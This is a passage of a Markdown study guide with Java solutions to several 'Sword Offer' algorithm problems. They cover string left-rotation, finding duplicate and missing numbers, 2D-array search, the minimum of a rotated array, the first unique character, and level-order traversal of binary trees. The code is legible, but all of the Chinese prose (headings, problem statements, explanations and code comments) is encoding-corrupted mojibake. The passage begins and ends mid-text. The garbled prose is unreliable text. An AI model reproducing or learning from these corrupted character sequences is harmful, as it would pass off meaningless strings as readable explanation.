\"umghlrlose\"\n\n### **è§£ç­”**\n\n#### æ–¹æ³•1ï¼šåˆ‡ç‰‡\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        return s.substring(n, s.length()) + s.substring(0, n);\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šéå†\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder res = new StringBuilder();\n\t\tfor(int i = n; i< s.length(); i++){\n            res.append(s.charAt(i));\n        }\n        for(int i = 0; i<n; i++){\n            res.append(s.charAt(i));\n        }\n        return res.toString();\n    }\n}\n```\n\n#### æ–¹æ³•3ï¼šåˆ©ç”¨æ±‚ä½™è¿ç®—\n\n```java\nclass Solution {\n    public String reverseLeftWords(String s, int n) {\n        StringBuilder res = new StringBuilder();\n        for(int i = n; i < n + s.length(); i++)\n            res.append(s.charAt(i % s.length()));\n        return res.toString();\n    }\n}\n```\n\n# ç¬¬ 4 å¤© æŸ¥æ‰¾ç®—æ³•(ç®€å•)\n\n## 03. æ•°ç»„ä¸­é‡å¤çš„æ•°å­—\n\n### é¢˜ç›®\n\n> åœ¨ä¸€ä¸ªé•¿åº¦ä¸º n çš„æ•°ç»„ nums é‡Œçš„æ‰€æœ‰æ•°å­—éƒ½åœ¨ 0ï½n-1 çš„èŒƒå›´å†…ã€‚æ•°ç»„ä¸­æŸäº›æ•°å­—æ˜¯é‡å¤çš„ï¼Œä½†ä¸çŸ¥é“æœ‰å‡ ä¸ªæ•°å­—é‡å¤äº†ï¼Œä¹Ÿä¸çŸ¥é“æ¯ä¸ªæ•°å­—é‡å¤äº†å‡ æ¬¡ã€‚è¯·æ‰¾å‡ºæ•°ç»„ä¸­ä»»æ„ä¸€ä¸ªé‡å¤çš„æ•°å­—ã€‚\n>\n> ```\n> è¾“å…¥ï¼š\n> [2, 3, 1, 0, 2, 5, 3]\n> è¾“å‡ºï¼š2 æˆ– 3 \n> ```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨/Set\n\nåˆ›å»ºä¸€ä¸ª Set ï¼Œéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†è¯¥å…ƒç´ åŠ å…¥ Set ä¸­ï¼Œåˆ¤æ–­æ˜¯å¦æ·»åŠ æˆåŠŸï¼ˆå› ä¸º Set ä¸å…è®¸å‡ºç°é‡å¤å…ƒç´ ï¼‰\n\n- å¦‚æœæ·»åŠ å¤±è´¥ï¼Œè¯´æ˜è¯¥å…ƒç´ å·²ç»åœ¨é›†åˆä¸­ï¼Œå› æ­¤è¯¥å…ƒç´ æ˜¯é‡å¤å…ƒç´ ï¼Œè¿”å›è¯¥å…ƒç´ \n- åä¹‹åˆ™æ²¡æœ‰é‡å¤\n\n```java\nclass Solution {\n    public int findRepeatNumber(int[] nums) {\n        Set<Integer> set = new HashSet<>();\n        for (int num : nums) {\n            if (!set.add(num)) {\n                return num;\n            }\n        }\n        return 0;\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šç´¢å¼•åŒ¹é…\n\n- ç”±é¢˜æ„å¯çŸ¥ï¼šé•¿åº¦ä¸º n çš„æ•°ç»„ nums é‡Œçš„æ‰€æœ‰æ•°å­—éƒ½åœ¨ 0ï½n-1 çš„èŒƒå›´å†…\n- å› æ­¤æ¯ä¸ªå…ƒç´ éƒ½å¯ä»¥æŒ‰ç…§å…¶å¯¹åº”çš„ä¸‹æ ‡è¿›è¡Œå­˜å–\n- å½“å…¶å¯¹åº”çš„ä¸‹æ ‡è¢«ç›¸åŒçš„å…ƒç´ å ç”¨æ—¶ï¼Œåˆ™è¯¥å…ƒç´ é‡å¤\n\n**ç®—æ³•æµç¨‹ï¼š**\n\n- éå†æ•°ç»„ nums ï¼Œè®¾ç´¢å¼•åˆå§‹å€¼ä¸º i = 0\n\n- è‹¥ nums[i] = iï¼š è¯´æ˜æ­¤æ•°å­—å·²åœ¨å¯¹åº”ç´¢å¼•ä½ç½®ï¼Œæ— éœ€äº¤æ¢ï¼Œå› æ­¤è·³è¿‡\n- è‹¥ nums[nums[i]] = nums[i]ï¼š ä»£è¡¨ç´¢å¼• nums[i] å¤„å’Œç´¢å¼• i å¤„çš„å…ƒç´ å€¼éƒ½ä¸º nums[i] ï¼Œå³æ‰¾åˆ°ä¸€ç»„é‡å¤å€¼ï¼Œè¿”å›æ­¤å€¼ nums[i] \n- å¦åˆ™ï¼š äº¤æ¢ç´¢å¼•ä¸º i å’Œ nums[i] çš„å…ƒç´ å€¼ï¼Œå°†æ­¤æ•°å­—äº¤æ¢è‡³å¯¹åº”ç´¢å¼•ä½ç½®\n- è‹¥éå†å®Œæ¯•å°šæœªè¿”å›ï¼Œåˆ™è¿”å› -1\n\n![](https://img.jwt1399.top/img/202207282300828.png)\n\n```java\nclass Solution {\n    public int findRepeatNumber(int[] nums) {\n        int i = 0;\n        while(i < nums.length) {\n            //å½“å‰å…ƒç´ æ­£å¥½åœ¨å…¶æ‰€å¯¹åº”çš„ä½ç½®ä¸Š\n            if(nums[i] == i) {\n                i++;\n                continue;\n            }\n            //å½“å‰å…ƒç´ æ‰€å¯¹åº”çš„ä½ç½®çš„å€¼å’Œå½“å‰å…ƒç´ ç›¸åŒï¼Œæ‰¾åˆ°é‡å¤å…ƒç´ ã€‚\n            if(nums[nums[i]] == nums[i]) return nums[i];\n            //äº¤æ¢ä¸¤ä¸ªå…ƒç´ ï¼Œé‡å¤å¾ªç¯ï¼Œç»§ç»­å¯¹å½“å‰ä¸‹æ ‡çš„å…ƒç´ è¿›è¡Œä¸‹æ ‡åŒ¹é…ã€‚\n            int tmp = nums[i];\n            nums[i] = nums[tmp];\n            nums[tmp] = tmp;\n        }\n        return -1;\n    }\n}\n```\n\n## 53 - I. åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­— I\n\n### é¢˜ç›®\n\n> ç»Ÿè®¡ä¸€ä¸ªæ•°å­—åœ¨æ’åºæ•°ç»„ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚ \n>\n> **ç¤ºä¾‹ 1:**\n>\n> ```\n> è¾“å…¥: nums = [5,7,7,8,8,10], target = 8\n> è¾“å‡º: 2\n> ```\n>\n> **ç¤ºä¾‹ 2:**\n>\n> ```\n> è¾“å…¥: nums = [5,7,7,8,8,10], target = 6\n> è¾“å‡º: 0\n> ```\n\n### è§£ç­”\n\n```java\nclass Solution {\n    public int search(int[] nums, int target) {\n        int count = 0 ;\n        for(int i = 0; i<nums.length;i++){\n            if(nums[i] == target){\n                count++;\n            }\n        }\n        return count;\n    }\n}\n```\n\n## 53 - II. 0ï½n-1ä¸­ç¼ºå¤±çš„æ•°å­—\n\n### é¢˜ç›®\n\n> ä¸€ä¸ªé•¿åº¦ä¸ºn-1çš„é€’å¢æ’åºæ•°ç»„ä¸­çš„æ‰€æœ‰æ•°å­—éƒ½æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”æ¯ä¸ªæ•°å­—éƒ½åœ¨èŒƒå›´0ï½n-1ä¹‹å†…ã€‚åœ¨èŒƒå›´0ï½n-1å†…çš„nä¸ªæ•°å­—ä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ•°å­—ä¸åœ¨è¯¥æ•°ç»„ä¸­ï¼Œè¯·æ‰¾å‡ºè¿™ä¸ªæ•°å­—ã€‚\n>\n> **ç¤ºä¾‹ 1:**\n>\n> ```\n> è¾“å…¥: [0,1,3]\n> è¾“å‡º: 2\n> ```\n>\n> **ç¤ºä¾‹ 2:**\n>\n> ```\n> è¾“å…¥: [0,1,2,3,4,5,6,7,9]\n> è¾“å‡º: 8\n> ```\n\n### è§£ç­”\n\n```java\nclass Solution {\n    public int missingNumber(int[] nums) {\n        for(int i = 0; i < nums.length; i++){\n            if (i != nums[i])\n                return i;\n        }\n        return  nums.length;\n    }\n}\n```\n\n# ç¬¬ 5 å¤© æŸ¥æ‰¾ç®—æ³•(ä¸­ç­‰)\n\n## 04. äºŒç»´æ•°ç»„ä¸­çš„æŸ¥æ‰¾\n\n### é¢˜ç›®\n\n> åœ¨ä¸€ä¸ª n * m çš„äºŒç»´æ•°ç»„ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½æŒ‰ç…§ä»å·¦åˆ°å³é€’å¢çš„é¡ºåºæ’åºï¼Œæ¯ä¸€åˆ—éƒ½æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹é€’å¢çš„é¡ºåºæ’åºã€‚è¯·å®Œæˆä¸€ä¸ªé«˜æ•ˆçš„å‡½æ•°ï¼Œè¾“å…¥è¿™æ ·çš„ä¸€ä¸ªäºŒç»´æ•°ç»„å’Œä¸€ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­æ•°ç»„ä¸­æ˜¯å¦å«æœ‰è¯¥æ•´æ•°ã€‚\n>\n> **ç¤ºä¾‹:**\n>\n> ç°æœ‰çŸ©é˜µ matrix å¦‚ä¸‹ï¼š\n>\n> ```\n> [\n>   [1,   4,  7, 11, 15],\n>   [2,   5,  8, 12, 19],\n>   [3,   6,  9, 16, 22],\n>   [10, 13, 14, 17, 24],\n>   [18, 21, 23, 26, 30]\n> ]\n> ```\n>\n> ç»™å®š target = `5`ï¼Œè¿”å› `true`ã€‚\n>\n> ç»™å®š target = `20`ï¼Œè¿”å› `false`ã€‚\n\n###  è§£ç­”\n\nç®—æ³•æµç¨‹ï¼š\n\n- ä»çŸ©é˜µ matrix å·¦ä¸‹è§’å…ƒç´ ï¼ˆç´¢å¼•è®¾ä¸º (i, j) ï¼‰å¼€å§‹éå†ï¼Œå¹¶ä¸ç›®æ ‡å€¼å¯¹æ¯”ï¼š\n  - å½“ `matrix[i][j] > target` æ—¶ï¼Œåˆ™ `target` åœ¨è¯¥è¡Œçš„ä¸Šæ–¹ï¼Œæ‰§è¡Œ `i--`ï¼Œå³æ¶ˆå»è¯¥è¡Œå…ƒç´ ï¼›\n  - å½“ `matrix[i][j] < target` æ—¶ï¼Œåˆ™ `target` åœ¨è¯¥è¡Œçš„å³æ–¹ï¼Œæ‰§è¡Œ `j++`ï¼Œå³æ¶ˆå»è¯¥åˆ—å…ƒç´ ï¼›\n  - å½“ `matrix[i][j] = target` æ—¶ï¼Œè¿”å› trueï¼Œä»£è¡¨æ‰¾åˆ°ç›®æ ‡å€¼ã€‚\n- è‹¥è¡Œç´¢å¼•æˆ–åˆ—ç´¢å¼•è¶Šç•Œï¼Œåˆ™ä»£è¡¨çŸ©é˜µä¸­æ— ç›®æ ‡å€¼ï¼Œè¿”å› falseã€‚\n\n```java\nclass Solution {\n    public boolean findNumberIn2DArray(int[][] matrix, int target) {\n        int i = matrix.length - 1, j = 0;\n        while(i >= 0 && j < matrix[0].length){\n            if(matrix[i][j] > target) i--;\n            else if (matrix[i][j] < target) j++;\n            else return true;\n        }\n        return false;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼š O(M+N)\n  - M å’Œ N åˆ†åˆ«ä¸ºçŸ©é˜µè¡Œæ•°å’Œåˆ—æ•°ï¼Œæ­¤ç®—æ³•æœ€å¤šå¾ªç¯ M+N æ¬¡ã€‚\n\n- ç©ºé—´å¤æ‚åº¦ï¼š O(1)\n  -  iï¼Œ j æŒ‡é’ˆä½¿ç”¨å¸¸æ•°å¤§å°é¢å¤–ç©ºé—´ã€‚\n\n## 11. æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—\n\n### é¢˜ç›®\n\n> æŠŠä¸€ä¸ªæ•°ç»„æœ€å¼€å§‹çš„è‹¥å¹²ä¸ªå…ƒç´ æ¬åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°ç»„çš„æ—‹è½¬ã€‚\n>\n> ç»™ä½ ä¸€ä¸ªå¯èƒ½å­˜åœ¨ **é‡å¤** å…ƒç´ å€¼çš„æ•°ç»„ `numbers` ï¼Œå®ƒåŸæ¥æ˜¯ä¸€ä¸ªå‡åºæ’åˆ—çš„æ•°ç»„ï¼Œå¹¶æŒ‰ä¸Šè¿°æƒ…å½¢è¿›è¡Œäº†ä¸€æ¬¡æ—‹è½¬ã€‚è¯·è¿”å›æ—‹è½¬æ•°ç»„çš„**æœ€å°å…ƒç´ **ã€‚ä¾‹å¦‚ï¼Œæ•°ç»„ `[3,4,5,1,2]` ä¸º `[1,2,3,4,5]` çš„ä¸€æ¬¡æ—‹è½¬ï¼Œè¯¥æ•°ç»„çš„æœ€å°å€¼ä¸º 1ã€‚ \n>\n> æ³¨æ„ï¼Œæ•°ç»„ `[a[0], a[1], a[2], ..., a[n-1]]` æ—‹è½¬ä¸€æ¬¡ çš„ç»“æœä¸ºæ•°ç»„ `[a[n-1], a[0], a[1], a[2], ..., a[n-2]]` ã€‚\n>\n> **ç¤ºä¾‹ 1ï¼š**\n>\n> ```\n> è¾“å…¥ï¼šnumbers = [3,4,5,1,2]\n> è¾“å‡ºï¼š1\n> ```\n>\n> **ç¤ºä¾‹ 2ï¼š**\n>\n> ```\n> è¾“å…¥ï¼šnumbers = [2,2,2,0,1]\n> è¾“å‡ºï¼š0\n> ```\n\n### è§£ç­”\n\nç®—æ³•æµç¨‹ï¼š\n\n- åˆå§‹åŒ–ï¼š å£°æ˜ lowï¼Œhigh åŒæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘ numbers æ•°ç»„å·¦å³ä¸¤ç«¯ï¼›\n- å¾ªç¯äºŒåˆ†ï¼š è®¾ pivot = (low + high) / 2 ä¸ºæ¯æ¬¡äºŒåˆ†çš„ä¸­ç‚¹ï¼ˆ \"/\" ä»£è¡¨å‘ä¸‹å–æ•´é™¤æ³•ï¼‰ï¼Œå¯åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š\n  - å½“ nums[pivot] > nums[high] æ—¶ï¼š æ—‹è½¬ç‚¹ x ä¸€å®šåœ¨ [pivot + 1, high] é—­åŒºé—´å†…ï¼Œå› æ­¤æ‰§è¡Œ low = pivot + 1ï¼›\n  - å½“ nums[pivot] < nums[high] æ—¶ï¼š æ—‹è½¬ç‚¹ x ä¸€å®šåœ¨ [low, pivot] é—­åŒºé—´å†…ï¼Œå› æ­¤æ‰§è¡Œ high = pivotï¼›\n  - å½“ nums[pivot] = nums[high] æ—¶ï¼š æ— æ³•åˆ¤æ–­ pivot åœ¨å“ªä¸ªæ’åºæ•°ç»„ä¸­ï¼Œå³æ— æ³•åˆ¤æ–­æ—‹è½¬ç‚¹ x åœ¨ [low, pivot] è¿˜æ˜¯ [pivot + 1, high] åŒºé—´ä¸­ã€‚è§£å†³æ–¹æ¡ˆï¼š æ‰§è¡Œ high = high - 1 ç¼©å°åˆ¤æ–­èŒƒå›´ï¼Œåˆ†æè§ä¸‹æ–‡ã€‚\n- è¿”å›å€¼ï¼š å½“ low = high æ—¶è·³å‡ºäºŒåˆ†å¾ªç¯ï¼Œå¹¶è¿”å›æ—‹è½¬ç‚¹çš„å€¼ nums[low] å³å¯ã€‚\n\n```java\nclass Solution {\n    public int minArray(int[] numbers) {\n        int low = 0;\n        int high = numbers.length - 1;\n        while (low < high) {\n            // int pivot = (low + high) / 2;\n            int pivot = low + (high - low) / 2; //é˜²æ­¢low + highé€ æˆæ•´å‹è¶Šç•Œ\n            if (numbers[pivot] < numbers[high]) {\n                high = pivot;\n            } else if (numbers[pivot] > numbers[high]) {\n                low = pivot + 1;\n            } else {\n                high -= 1;\n            }\n        }\n        return numbers[low];\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(log<sub>n</sub>)\n\n- ç©ºé—´å¤æ‚åº¦ï¼šO(1)\n\n## 50. ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦\n\n### é¢˜ç›®\n\n> åœ¨å­—ç¬¦ä¸² s ä¸­æ‰¾å‡ºç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚å¦‚æœæ²¡æœ‰ï¼Œè¿”å›ä¸€ä¸ªå•ç©ºæ ¼ã€‚ s åªåŒ…å«å°å†™å­—æ¯ã€‚\n>\n> **ç¤ºä¾‹ 1:**\n>\n> ```\n> è¾“å…¥ï¼šs = \"abaccdeff\"\n> è¾“å‡ºï¼š'b'\n> ```\n>\n> **ç¤ºä¾‹ 2:**\n>\n> ```\n> è¾“å…¥ï¼šs = \"\" \n> è¾“å‡ºï¼š' '\n> ```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå“ˆå¸Œè¡¨/Map\n\n1. éå†å­—ç¬¦ä¸² `s` ï¼Œä½¿ç”¨å“ˆå¸Œè¡¨ç»Ÿè®¡å„å­—ç¬¦å‡ºç°æ¬¡æ•°ã€‚\n2. å†éå†å­—ç¬¦ä¸² `s` ï¼Œåœ¨å“ˆå¸Œè¡¨ä¸­æ‰¾åˆ°é¦–ä¸ª â€œæ•°é‡ä¸º 1 çš„å­—ç¬¦â€ï¼Œå¹¶è¿”å›ã€‚\n\n```java\nclass Solution {\n    public char firstUniqChar(String s) {\n        HashMap<Character,Integer> map = new HashMap<>();\n        char[] S = s.toCharArray();\n        for(char i : S)\n            map.put(i,map.getOrDefault(i,0)+1);\n        for (char i : S)\n            if(map.get(i)==1)\n                return i;\n        return ' ';\n    }\n}\n```\n\n#### æ–¹æ³•2ï¼šæœ‰åºå“ˆå¸Œè¡¨\n\nåœ¨å“ˆå¸Œè¡¨çš„åŸºç¡€ä¸Šï¼Œæœ‰åºå“ˆå¸Œè¡¨ä¸­çš„é”®å€¼å¯¹æ˜¯ **æŒ‰ç…§æ’å…¥é¡ºåºæ’åº** çš„ã€‚åŸºäºæ­¤ï¼Œå¯é€šè¿‡éå†æœ‰åºå“ˆå¸Œè¡¨ï¼Œå®ç°æœç´¢é¦–ä¸ª â€œæ•°é‡ä¸º 1 çš„å­—ç¬¦â€ã€‚\n\n```java\nclass Solution {\n    public char firstUniqChar(String s) {\n        Map<Character, Integer> map = new LinkedHashMap<>();\n        char[] S = s.toCharArray();\n        for(char i : S)\n            map.put(i,map.getOrDefault(i,0)+1);\n        for(Map.Entry<Character, Integer> d : map.entrySet()){\n           if(d.getValue()==1) \n             return d.getKey();\n        }\n        return ' ';\n    }\n}\n```\n\n### å¤æ‚åº¦\n\næ–¹æ³•1:\n\n- æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ n æ˜¯å­—ç¬¦ä¸² s çš„é•¿åº¦ã€‚\n\n- ç©ºé—´å¤æ‚åº¦ï¼šO(1)ï¼Œ s åªåŒ…å«å°å†™å­—æ¯ï¼Œå› æ­¤æœ€å¤šæœ‰ 26 ä¸ªä¸åŒå­—ç¬¦ï¼ŒHashMap å­˜å‚¨éœ€å ç”¨ O(26) = O(1) çš„é¢å¤–ç©ºé—´ã€‚\n\næ–¹æ³•2:\n\næ—¶é—´å’Œç©ºé—´å¤æ‚åº¦å‡ä¸ â€œæ–¹æ³•1â€ ç›¸åŒï¼Œè€Œå…·ä½“åˆ†æï¼šæ–¹æ³• 1 éœ€éå† s ä¸¤è½®ï¼›æ–¹æ³• 2 éå† s ä¸€è½®ï¼Œéå† map                 ä¸€è½®ï¼ˆ map çš„é•¿åº¦ä¸å¤§äº 26 ï¼‰ã€‚\n\n# ç¬¬6å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆç®€å•ï¼‰\n\n##  32 - I. ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘\n\n### é¢˜ç›®\n\n>ä»ä¸Šåˆ°ä¸‹æ‰“å°å‡ºäºŒå‰æ ‘çš„æ¯ä¸ªèŠ‚ç‚¹ï¼ŒåŒä¸€å±‚çš„èŠ‚ç‚¹æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ã€‚\n>\n>ä¾‹å¦‚:\n>ç»™å®šäºŒå‰æ ‘: [3,9,20,null,null,15,7],\n>\n>        3\n>       / \\\n>      9  20\n>        /  \\\n>       15   7\n>\n>\n>è¿”å›ï¼š\n>\n>[3,9,20,15,7]\n\n### è§£ç­”\n\nç®—æ³•æµç¨‹ï¼š\n\n- ç‰¹ä¾‹å¤„ç†ï¼š å½“æ ‘çš„æ ¹èŠ‚ç‚¹ä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºåˆ—è¡¨ [] ï¼›\n- åˆå§‹åŒ–ï¼š ç»“æœåˆ—è¡¨ res = [] ï¼ŒåŒ…å«æ ¹èŠ‚ç‚¹çš„é˜Ÿåˆ— queue = [root] ï¼›\n- BFS å¾ªç¯ï¼š å½“é˜Ÿåˆ— queue ä¸ºç©ºæ—¶è·³å‡ºï¼›\n  - å‡ºé˜Ÿï¼š é˜Ÿé¦–å…ƒç´ å‡ºé˜Ÿï¼Œè®°ä¸º nodeï¼›\n  - æ‰“å°ï¼š å°† node.val æ·»åŠ è‡³åˆ—è¡¨ tmp å°¾éƒ¨ï¼›\n  - æ·»åŠ å­èŠ‚ç‚¹ï¼š è‹¥ node çš„å·¦ï¼ˆå³ï¼‰å­èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œåˆ™å°†å·¦ï¼ˆå³ï¼‰å­èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ— queue ï¼›\n- è¿”å›å€¼ï¼š è¿”å›æ‰“å°ç»“æœåˆ—è¡¨ res å³å¯ã€‚\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public int[] levelOrder(TreeNode root) {\n        if(root == null) return new int[0];// ç©ºæ ‘åˆ™è¿”å›ç©ºæ•°ç»„\n        Queue<TreeNode> queue = new LinkedList<>();// å€ŸåŠ©ä¸€ä¸ªé˜Ÿåˆ—ï¼Œé€šè¿‡ BFS å®ç°æŒ‰å±‚éå†äºŒå‰æ ‘\n        queue.add(root);// æ ¹ç»“ç‚¹å…ˆå…¥é˜Ÿ\n        ArrayList<Integer> tmp = new ArrayList<>();// ç”³è¯·ä¸€ä¸ªåŠ¨æ€æ•°ç»„ ArrayList åŠ¨æ€æ·»åŠ èŠ‚ç‚¹å€¼\n        while(!queue.isEmpty()){\n            TreeNode node = queue.poll();// å–å‡ºå½“å‰é˜Ÿé¦–å…ƒç´ \n            tmp.add(node.val);\n            if(node.left != null) queue.add(node.left);// å·¦å­èŠ‚ç‚¹å…¥é˜Ÿ\n            if(node.right != null) queue.add(node.right);// å³å­èŠ‚ç‚¹å…¥é˜Ÿ\n        }\n     \t\t// å°† ArrayList è½¬ä¸º int æ•°ç»„å¹¶è¿”å›\n        int[] res = new int[tmp.size()];\n        for(int i = 0; i < res.length; i++)\n          res[i] = tmp.get(i);\n        return res;  \n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ O(N) ï¼š N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå³ BFS éœ€å¾ªç¯ N æ¬¡ã€‚\n- ç©ºé—´å¤æ‚åº¦ O(N)ï¼š æœ€å·®æƒ…å†µä¸‹ï¼Œå³å½“æ ‘ä¸ºå¹³è¡¡äºŒå‰æ ‘æ—¶ï¼Œæœ€å¤šæœ‰ N/2 ä¸ªæ ‘èŠ‚ç‚¹åŒæ—¶åœ¨ queue ä¸­ï¼Œä½¿ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 32 - II. ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘ II\n\n### é¢˜ç›®\n\n> ä»ä¸Šåˆ°ä¸‹æŒ‰å±‚æ‰“å°äºŒå‰æ ‘ï¼ŒåŒä¸€å±‚çš„èŠ‚ç‚¹æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œæ¯ä¸€å±‚æ‰“å°åˆ°ä¸€è¡Œã€‚\n>\n> ä¾‹å¦‚:\n> ç»™å®šäºŒå‰æ ‘: [3,9,20,null,null,15,7],\n>\n>         3\n>        / \\\n>       9  20\n>         /  \\\n>        15   7\n>\n> è¿”å›å…¶å±‚æ¬¡éå†ç»“æœï¼š\n>\n> ```\n> [\n>   [3],\n>   [9,20],\n>   [15,7]\n> ]\n> ```\n\n### è§£ç­”\n\nç®—æ³•æµç¨‹ï¼š\n\n- ç‰¹ä¾‹å¤„ç†ï¼š å½“æ ¹èŠ‚ç‚¹ä¸ºç©ºï¼Œåˆ™è¿”å›ç©ºåˆ—è¡¨ [] ï¼›\n- åˆå§‹åŒ–ï¼š æ‰“å°ç»“æœåˆ—è¡¨ res = [] ï¼ŒåŒ…å«æ ¹èŠ‚ç‚¹çš„é˜Ÿåˆ— queue = [root] ï¼›\n- BFS å¾ªç¯ï¼š å½“é˜Ÿåˆ— queue ä¸ºç©ºæ—¶è·³å‡ºï¼›\n  - æ–°å»ºä¸€ä¸ªä¸´æ—¶åˆ—è¡¨ tmp ï¼Œç”¨äºå­˜å‚¨å½“å‰å±‚æ‰“å°ç»“æœï¼›\n  - å½“å‰å±‚æ‰“å°å¾ªç¯ï¼š å¾ªç¯æ¬¡æ•°ä¸ºå½“å‰å±‚èŠ‚ç‚¹æ•°ï¼ˆå³é˜Ÿåˆ— queue é•¿åº¦ï¼‰ï¼›\n    - å‡ºé˜Ÿï¼š é˜Ÿé¦–å…ƒç´ å‡ºé˜Ÿï¼Œè®°ä¸º nodeï¼›\n    - æ‰“å°ï¼š å°† node.val æ·»åŠ è‡³ tmp å°¾éƒ¨ï¼›\n    - æ·»åŠ å­èŠ‚ç‚¹ï¼š è‹¥ node çš„å·¦ï¼ˆå³ï¼‰å­èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œåˆ™å°†å·¦ï¼ˆå³ï¼‰å­èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ— queue ï¼›\n  - å°†å½“å‰å±‚ç»“æœ tmp æ·»åŠ å…¥ res ã€‚\n- è¿”å›å€¼ï¼š è¿”å›æ‰“å°ç»“æœåˆ—è¡¨ res å³å¯ã€‚\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.add(root);\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        while(!queue.isEmpty()) {\n            List<Integer> tmp = new ArrayList<>();\n            for(int i = queue.size(); i > 0; i--) {\n                TreeNode node = queue.poll();\n                tmp.add(node.val);\n                if(node.left != null) queue.add(node.left);\n                if(node.right != null) queue.add(node.right);\n            }\n            res.add(tmp);\n        }\n        return res;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n- æ—¶é—´å¤æ‚åº¦ O(N)ï¼š N ä¸ºäºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå³ BFS éœ€å¾ªç¯ N æ¬¡ã€‚\n- ç©ºé—´å¤æ‚åº¦ O(N) ï¼š æœ€å·®æƒ…å†µä¸‹ï¼Œå³å½“æ ‘ä¸ºå¹³è¡¡äºŒå‰æ ‘æ—¶ï¼Œæœ€å¤šæœ‰ N/2 ä¸ªæ ‘èŠ‚ç‚¹åŒæ—¶åœ¨ queue ä¸­ï¼Œä½¿ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 32 - III. ä»ä¸Šåˆ°ä¸‹æ‰“å°äºŒå‰æ ‘ III\n\n### é¢˜ç›®\n\n> è¯·å®ç°ä¸€ä¸ªå‡½æ•°æŒ‰ç…§ä¹‹å­—å½¢é¡ºåºæ‰“å°äºŒå‰æ ‘ï¼Œå³ç¬¬ä¸€è¡ŒæŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œç¬¬äºŒå±‚æŒ‰ç…§ä»å³åˆ°å·¦çš„é¡ºåºæ‰“å°ï¼Œç¬¬ä¸‰è¡Œå†æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ‰“å°ï¼Œå…¶ä»–è¡Œä»¥æ­¤ç±»æ¨ã€‚\n>\n> ä¾‹å¦‚:\n> ç»™å®šäºŒå‰æ ‘: [3,9,20,null,null,15,7],\n>\n>         3\n>        / \\\n>       9  20\n>         /  \\\n>        15   7\n>\n> è¿”å›å…¶å±‚æ¬¡éå†ç»“æœï¼š\n>\n> ```\n> [\n>   [3],\n>   [20,9],\n>   [15,7]\n> ]\n> ```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šå±‚åºéå† + åŒç«¯é˜Ÿåˆ—\n\nåˆ©ç”¨åŒç«¯é˜Ÿåˆ—çš„ä¸¤ç«¯çš†å¯æ·»åŠ å…ƒç´ çš„ç‰¹æ€§ï¼Œè®¾æ‰“å°åˆ—è¡¨ï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰ tmp ï¼Œå¹¶è§„å®šï¼š\n\n- å¥‡æ•°å±‚ åˆ™æ·»åŠ è‡³ tmp å°¾éƒ¨ ï¼Œ\n- å¶æ•°å±‚ åˆ™æ·»åŠ è‡³ tmp å¤´éƒ¨ ã€‚\n\nç®—æ³•æµç¨‹ï¼š\n\n- ç‰¹ä¾‹å¤„ç†ï¼š å½“æ ‘çš„æ ¹èŠ‚ç‚¹ä¸ºç©ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºåˆ—è¡¨ [] ï¼›\n- åˆå§‹åŒ–ï¼š æ‰“å°ç»“æœç©ºåˆ—è¡¨ res ï¼ŒåŒ…å«æ 